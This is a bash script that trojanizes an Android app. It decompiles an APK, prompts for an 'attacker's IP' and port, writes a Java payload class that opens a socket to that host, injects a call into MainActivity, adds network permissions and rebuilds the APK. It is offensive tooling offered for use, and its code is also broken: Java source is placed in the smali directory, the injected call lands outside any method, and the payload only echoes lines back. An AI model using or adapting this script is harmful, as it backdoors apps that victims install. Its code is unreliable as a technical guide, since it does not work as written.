#!/bin/bash

# Step 1: Ask the user to drag and drop the APK file or manually enter the full path
echo "Please drag and drop the APK file into the terminal or manually enter the full path (e.g., /root/Desktop/output.apk):"
read APK_PATH

# Remove single quotes if the path contains them (this happens when dragging and dropping in the terminal)
APK_PATH=$(echo "$APK_PATH" | sed "s/'//g")

# Verify that the APK file exists
if [ ! -f "$APK_PATH" ]; then
    echo "The file $APK_PATH does not exist or is not a valid APK file. Exiting."
    exit 1
fi

# Step 2: Decompile the APK using apktool
echo "Decompiling APK..."
apktool d "$APK_PATH" -o /root/Desktop/decompiled_apk

# Verify that the decompilation was successful
if [ ! -d "/root/Desktop/decompiled_apk" ]; then
    echo "Decompilation failed. Exiting."
    exit 1
fi

# Set the decompiled directory path
DECOMPILE_DIR="/root/Desktop/decompiled_apk"

# Step 3: Rename all files in the drawable folder by replacing $ with _
echo "Renaming invalid resource files in the drawable folder..."
find "$DECOMPILE_DIR/res/drawable" -type f -name '*$*' | while read -r file; do
    # Generate the new file name by replacing $ with _
    new_file=$(echo "$file" | tr '$' '_')
    
    # Rename the file
    mv "$file" "$new_file"
    echo "Renamed: $file -> $new_file"
done

# Step 4: Ask the user for the attacker's IP address and port
echo "Please enter the attacker's IP address:"
read ATTACKER_IP

echo "Please enter the port to listen on:"
read PORT

# Step 5: Generate the payload with user-specified IP and port
PAYLOAD_CODE="import java.io.*; 
import java.net.*;

public class Payload {
    public static void inject() {
        try {
            String host = \"$ATTACKER_IP\";  // Your attacker's IP address
            int port = $PORT;  // Port to listen on
            Socket socket = new Socket(host, port);
            BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            PrintWriter writer = new PrintWriter(socket.getOutputStream(), true);

            String line;
            while ((line = reader.readLine()) != null) {
                writer.println(line);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
"

# Step 6: Add the payload code to the decompiled project
# Create a new file for the payload class
echo "$PAYLOAD_CODE" > "$DECOMPILE_DIR/smali/com/example/payload/Payload.java"

# Step 7: Modify the target activity to call the payload
TARGET_ACTIVITY="MainActivity"
TARGET_ACTIVITY_PATH="$DECOMPILE_DIR/smali/com/example/app/$TARGET_ACTIVITY.java"

# Inject the call to the payload in the onCreate() method of the target activity
# Make sure the following line is added inside the onCreate method
sed -i '/public void onCreate/i Payload.inject();' "$TARGET_ACTIVITY_PATH"

# Step 8: Modify the AndroidManifest.xml to request necessary permissions
MANIFEST_PATH="$DECOMPILE_DIR/AndroidManifest.xml"

# Add necessary permissions (e.g., internet and network state permissions)
sed -i '/<application/i <uses-permission android:name="android.permission.INTERNET" />' "$MANIFEST_PATH"
sed -i '/<application/i <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />' "$MANIFEST_PATH"

# Step 9: Create the output directory for the APK if it doesn't exist
OUTPUT_DIR="$(pwd)/injectedapk"  # Directory to store the modified APK

# Check if the output directory exists, if not, create it
if [ ! -d "$OUTPUT_DIR" ]; then
    mkdir "$OUTPUT_DIR"
    echo "Created directory: $OUTPUT_DIR"
fi

# Step 10: Generate the output APK file name based on the input APK file name
OUTPUT_APK_NAME=$(basename "$APK_PATH" .apk)  # Get the APK base name without the .apk extension
OUTPUT_PATH="$OUTPUT_DIR/$OUTPUT_APK_NAME.apk"  # Output APK location with "-modified" appended

# Step 11: Rebuild the APK with the payload injected
apktool b "$DECOMPILE_DIR" --use-aapt2 -o "$OUTPUT_PATH"

echo "Payload injected with IP: $ATTACKER_IP and Port: $PORT. The APK is located at $OUTPUT_PATH"
